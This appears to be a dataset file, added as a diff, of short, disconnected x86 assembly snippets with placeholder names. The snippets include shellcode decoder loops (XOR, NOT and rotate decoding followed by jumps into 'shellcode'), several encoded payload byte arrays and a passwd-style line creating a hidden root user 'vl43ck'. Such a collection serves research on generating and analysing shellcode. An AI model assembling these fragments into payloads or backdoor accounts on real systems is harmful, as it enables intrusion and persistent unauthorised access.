@@ -1,0 +1,305 @@
+shellcode :
+"mov var0 , esp"
+var0 : \n inc var1 \n inc var1
+"xor var0 , var0 \n mov al , [esi+1]"
+"mov al , byte [esi+1+ebp]"
+"shr var0 , 24"
+inc var0
+jmp two
+"add al , var0"
+"mov byte [var1] , var0"
+"pop var0 \n mov ax , [var0]"
+decoder :
+"xor ax , var0"
+"mov var1 , [var0]"
+var0 : \n pop var1
+pop var0
+div var1
+"test var1 , var1 \n js short var0"
+var0 : \n call var1
+"mov bl , byte [edi]"
+var0 :
+var0 :
+"sub cx , cx"
+jmp short main
+jmp short output
+"mov ax , [var0]"
+"xor ax , var1 \n jz var0"
+jmp short shellcode
+"mov var0 , esp"
+pop var0
+"mov var0 , dl"
+inc var0
+var0 :
+"xor var0 , var0 \n push var0"
+jnc var0
+var0 :
+"mov cl , byte [esi]"
+loop decrypt
+var0 :
+"add ax , var0"
+dec var0
+"var0 : db 0x4e , 0xc1 , 0x51 , 0x2f , 0x58 , 0x3c , 0xdb , 0xac , 0xef , 0x82 , 0xef , 0x1c , 0x2a , 0xd9 , 0xdb , 0x90 , 0xdb , 0x6b , 0xef , 0x61 , 0x3b , 0x1c , 0xcb , 0x24 , 0xfb , 0xd6 , 0xc5 , 0x50 , 0x23 , 0xfa , 0x58 , 0x9c , 0xc5 , 0xb1 , 0x33 , 0x97 , 0x28 , 0x31 , 0xc5 , 0xaa , 0x43 , 0xf9 , 0x56 , 0xf4 , 0xad , 0xc2 , 0x02 , 0x16 , 0x55 , 0xe3"
+"sub cl , 1 \n jnz decode"
+global var0
+dec esp
+"var0 : \n pop var2 \n mov var1 , var2"
+"xor var0 , var0"
+"mov al , cl"
+loop decode \n jmp var2
+"shl var0 , 28"
+"sub cl , dl"
+"sub bl , byte [var1]"
+get :
+var0 : \n not cl \n inc cl
+"sub var1 , var0"
+"add var1 , var0"
+"cmp al , cl \n jne short decode \n jmp shellcode"
+pop var0
+dec var0
+"rol var0 , 0x4"
+"add var0 , 48"
+popad
+four :
+inc esi \n jmp var0
+pop var0
+"mov var1 , var0"
+inc var0 \n inc var0
+"lea var1 , [var0]"
+"mov var1 , var0"
+"cmp BYTE [var0] , var1 \n jle var2"
+var0 :
+"pop var0 \n mov cx , [var0]"
+"xor var0 , var0 \n mov dl , 5"
+"xor var0 , var0"
+"add var1 , var0"
+var0 :
+"shr var0 , 28"
+var0 : \n not byte [var1]
+"xor var0 , var1 \n jz encoded"
+"mov cl , 0102"
+dec dl \n jz var0
+inc var0
+inc esi \n inc esi
+"lea var0 , [esi+1]"
+"mov byte [esi+10] , al"
+var0 : \n pop var1
+"mov var0 , esp"
+var0 :
+jmp data
+"sub ax , 13"
+inc var0 \n inc var0 \n inc var0 \n inc var0
+"test var0 , var0 \n jz socket"
+"shl var0 , 2"
+"xor var0 , ecx \n mov dl , [esi+1]"
+pop var0
+loop decode \n jmp var2
+var0 : \n pop var1
+jmp short var0
+"mov dl , var0"
+var0 :
+pop var0
+jz encoded
+"mov cl , var0"
+dec dl \n jnz var0
+"cmp var0 , var1 \n je var2 \n jmp var3"
+cycle :
+"mov dl , byte [esi+1]"
+"mov var1 , var0"
+call var0
+dec var0 \n jz var1
+"cmp ax , var1 \n jne var0"
+"xor var0 , var0"
+"xor byte [var0] , var1"
+main :
+"mov bl , byte [esi+eax+1]"
+"shr dl , 1"
+retry :
+pop var0
+"mov byte [var1] , var0"
+jmp short var0
+"rol byte [var0] , 0x1"
+"mov var1 , var0"
+"add byte [var0] , 2"
+"mov dl , var0"
+nop
+"mov var1 , var0"
+"mov [var0] , al"
+not byte [var1]
+"xor var0 , var0 \n mov cl , 2"
+"mov var0 , esp"
+var0 equ $-shellcode
+call var0
+var0 : \n not cl \n inc cl
+"mov cl , al"
+"shr var0 , 4"
+var0 :
+"xor var0 , var0"
+"mov bl , byte [esi]"
+"xor var0 , var0"
+encrypt :
+inc var0
+"mov al , dl"
+"mov al , var0"
+"mov byte [var0] , al"
+"shl var0 , 8"
+"lea edi , [esi+13]"
+"xor var0 , var0 \n cmp var3 , var0 \n jne var2"
+"mov dl , byte [var0]"
+inc var0
+pop var0
+"sub esp , byte var0"
+"mov bl , byte [eax]"
+"add var0 , 1"
+"shellcode : db 0x4b , 0xf7 , 0x13 , 0x59 , 0xcc , 0x8c , 0x63 , 0x5e , 0x9f , 0x8d , 0x99 , 0x9f , 0x1f , 0xa4 , 0x3b , 0x6e , 0xc6 , 0x36 , 0x23"
+"mov var1 , var0"
+"xor var1 , var1"
+"xor dl , var1 \n jz var0"
+"mov [esi+13] , al"
+not word ax
+call var0
+"mov [var0] , al"
+"xor byte [var0] , cl"
+"var0 : \n cmp byte [esi] , var3 \n jl var1 \n sub byte [esi] , var3 \n jmp var6"
+stage :
+var0 : inc var1 \n jmp short var2
+"sub var0 , al"
+"mov var1 , byte [var0]"
+"ror var0 , 1"
+jmp short var0
+"xor cl , 0XAA \n jz var0"
+"xor var0 , var0"
+"xor byte [var0] , var1"
+loop decode \n jmp var2
+"lea esi , [esi+4]"
+loop decode
+var0 :
+"mov al , byte [esi]"
+"mov al , byte [var0]"
+"mov var1 , byte var0"
+"mov word [var1] , 2"
+"mov byte [var1] , var0"
+"pop var0 \n mov var1 , [var0]"
+inc var0 \n inc var0
+"mov var1 , var0"
+"mov byte [var0] , dl"
+"sub esp , 4"
+decrypt :
+"xor var0 , var0 \n mov cl , var1"
+"mov var1 , var0"
+"xor var0 , var0 \n push var0"
+var0 :
+pop var0
+"mov dl , var0"
+"xor var0 , var0 \n mov al , 2"
+inc var0
+inc var0
+inc var0 \n inc var0
+"xor var0 , var0 \n mov cl , [esi+1]"
+var0 : \n not cl \n inc cl
+"xor cl , var0"
+"shl var0 , 1"
+"shr dl , 4"
+inc var0
+"xor var0 , var0 \n xor var1 , var1 \n xor var2 , var2"
+"ror byte [var0] , 0x1"
+"shellcode : db ""vl43ck : $6$bxwJfzor$var2 . var3 . var4 : 0 : 0 : vl43ck : /tmp : /var7"""
+"xor ax , var0"
+"mov dl , byte [eax+1]"
+"lea edi , [esi]"
+"mov var1 , byte [var0]"
+"sub var1 , var0"
+"shr ax , cl"
+"xor var0 , var0"
+"mov cl , byte [var0]"
+"mov var0 , 1"
+jmp short var0
+"mov bh , var0"
+"add var0 , 4"
+"mov var1 , var0"
+inc esi
+mul var1
+"mov al , byte [var0]"
+jmp short get
+"xor al , var0"
+"var1 : \n sub byte [esi] , 7"
+loop decode
+"mov var1 , var0"
+var0 :
+"mov bl , byte [esi+ecx+1]"
+"add al , 2"
+var0 :
+var0 :
+call decoder
+"xor var0 , var0"
+"shr var0 , var2 \n not byte var0"
+"cmp DWORD [var0] , var1 \n je while"
+"sub ax , 1564"
+"mov byte [esi+ecx] , bl"
+odd_number :
+var0 :
+"cmp var0 , var1 \n je shellcode"
+"mov bh , var0"
+var0 :
+"mov var0 , 78"
+"mov var1 , var0"
+var0 : \n call [esp]
+"xor var1 , var1 \n mul var1"
+"mov byte [edx+eax] , bl"
+var0 :
+jmp short three
+loop var2 \n jmp var3
+"mov cl , var0"
+"mov var1 , byte [var0]"
+"mov cl , var0[2]"
+"mov var1 , var0"
+decode :
+pop esi
+pop var0
+"mov byte [esi+1] , dl"
+loop decode \n jmp short shellcode
+"xor var0 , var0 \n cmp var3 , var0 \n jne var2"
+"add byte [var] , 30"
+"cmp BYTE var2 , [var1] \n jne var0"
+"mov ax , table[esi*4]"
+"mov dl , byte var0"
+shell :
+var0 :
+var0 : \n jmp short var1
+"cmp byte [var0] , 0xD \n jle var1"
+"xor var0 , var1 \n jz formatting"
+"mov var1 , var0"
+"var0 : \n mov var1 , byte [esi]"
+var0 : \n inc var1
+"xor cl , var1 \n jnz var0"
+"mov ebx , [var0]"
+formatting :
+"mov var1 , var0"
+"xchg [var0] , var1"
+"shr var0 , cl"
+"shr ax , 1"
+"var1 : \n add byte [esi] , 8"
+inc esi \n jmp short var0
+execute :
+"mov byte [ebx+35] , al"
+pop cx
+"sub byte [var0] , 3 \n not byte [var0]"
+"var0 : db 0x32 , 0x51 , 0x30 , 0x74 , 0x69 , 0x63 , 0x6f , 0xe4 , 0x8a , 0x54 , 0xe2 , 0x0c , 0x81 , 0xc1 , 0x69 , 0x30 , 0x69 , 0x30 , 0x6a , 0x8a , 0x51 , 0xe3 , 0x8a , 0xb1 , 0xce"
+"add eax , 3 \n jnz var1"
+"xor var0 , var0 \n mov bl , var1"
+"mov byte [esp] , 0x2e"
+"xor var0 , var0 \n xor var1 , var1"
+inc esi
+format :
+"xor var0 , var0 \n cmp var2 , var0 \n jne exit"
+"mov byte [esp] , 0x0a"
+"xor var0 , var0 \n mov cl , 5"
+call var0
+"test var0 , var0"
+"push var0 \n mov var1 , esp"
+"sub dl , al \n jns var0"
+"xor var0 , var0 \n xor var1 , var1"
+"xor var0 , bh"
+dec cl \n jns var0
+push var0
+"var0 : \n xor byte [var1] , var2"
